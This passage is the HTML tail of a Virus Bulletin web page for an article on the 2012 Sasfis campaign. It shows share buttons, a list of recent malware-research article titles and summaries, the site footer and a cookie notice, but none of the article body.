href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign&t=Tracking the 2012 Sasfis campaign"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">

			<h3 class="ccm-page-list-title">
			<a href="/virusbulletin/2023/10/nexus-android-banking-botnet-compromising-cc-panels-and-dissecting-mobile-appinjects/" target="_self">Nexus Android banking botnet &ndash; compromising C&amp;C panels and dissecting mobile AppInjects</a>
		</h3>
		<div class="ccm-page-list-description">
			Aditya Sood &amp; Rohit Bansal provide details of a security vulnerability in the Nexus Android botnet C&amp;C panel that was exploited to compromise the C&amp;C panel in order to gather threat intelligence, and present a model of mobile AppInjects.		</div>
		
			<h3 class="ccm-page-list-title">
			<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
		</h3>
		<div class="ccm-page-list-description">
			TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip;		</div>
		
			<h3 class="ccm-page-list-title">
			<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
		</h3>
		<div class="ccm-page-list-description">
			Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip;		</div>
		
			<h3 class="ccm-page-list-title">
			<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
		</h3>
		<div class="ccm-page-list-description">
			In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip;		</div>
		
			<h3 class="ccm-page-list-title">
			<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
		</h3>
		<div class="ccm-page-list-description">
			Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip;		</div>
		
	 

	 
</div><!-- end .ccm-page-list -->


<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p>		</div>
	</div>
</div>

<!-- Footer
    ================================================== -->
    <footer class="bs-footer" role="contentinfo">
      <div class="container">
        <div class="bs-social">
			<div class="row ">
						
				<div class="col-md-3">
					<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p>				</div>
				<div class="col-md-3">
					<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb100/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p>				</div>	
									<div class="col-md-3">
					<p><a title="VB2024" href="/conference/vb2024/">VB2024 (Dublin)</a></p>
<p><a title="VB2023" href="/conference/vb2023/">VB2023 (London)</a></p>
<p><a title="VB2022" href="/conference/vb2022/">VB2022 (Prague)</a></p>
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p>					</div>	
				
									<div class="col-md-3">
					<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div>					</div>	
				
								
			</div>
			<div class="row ">
				<div class="col-md-12">
									</div>							
			</div>
		</div>
      </div>
    </footer>

	<!-- lian's attempt for a new footer -->
    <footer class="bs-footer2" role="contentinfo">
      <div class="container">
        <div class="bs-social2">
			<div class="row ">
						
				<div class="col-md-3">
									</div>
				<div class="col-md-3">
									</div>	
									<div class="col-md-3">
										</div>	
				
									<div class="col-md-3">
										</div>	
				
								
			</div>
			<div class="row ">
				<div class="col-md-12">
					<p style="text-align: left;">©1989-2025 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p>				</div>							
			</div>
		</div>
      </div>
    </footer>

<script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TDBVSRVN"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
	<div class="disclosure-container">
					<div class="disclosure-content">
				<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
			</div>
			<div class="disclosure-form">
	<form action="/index.php/cookies_disclosure/" method="POST">
					<input type="hidden" name="allowCookies" value="1" />
							<div class="button">
			<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
		</div>
	</form>
</div>
				<div class="ccm-spacer">&nbsp;</div>
	</div>
</div>
</body>
</html>